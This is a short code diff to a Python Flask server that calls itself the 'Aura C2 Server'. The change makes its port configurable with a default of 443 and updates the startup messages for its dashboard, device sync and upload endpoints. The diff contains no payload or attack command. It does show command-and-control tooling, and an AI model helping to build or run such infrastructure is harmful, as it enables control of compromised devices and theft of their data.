@@ -250,8 +250,9 @@ def serve_upload(device_id, filename):
 
 if __name__ == '__main__':
     init_db()
+    port = int(os.environ.get('PORT', 443))
     print("\n[*] Aura C2 Server starting...")
-    print("[*] Dashboard: http://0.0.0.0:8080/dashboard")
-    print("[*] API Sync:  http://0.0.0.0:8080/api/sync")
-    print("[*] Upload:    http://0.0.0.0:8080/api/upload\n")
-    app.run(host='0.0.0.0', port=8080, debug=False)
+    print(f"[*] Dashboard: http://0.0.0.0:{port}/dashboard")
+    print(f"[*] API Sync:  http://0.0.0.0:{port}/api/sync")
+    print(f"[*] Upload:    http://0.0.0.0:{port}/api/upload\n")
+    app.run(host='0.0.0.0', port=port, debug=False)
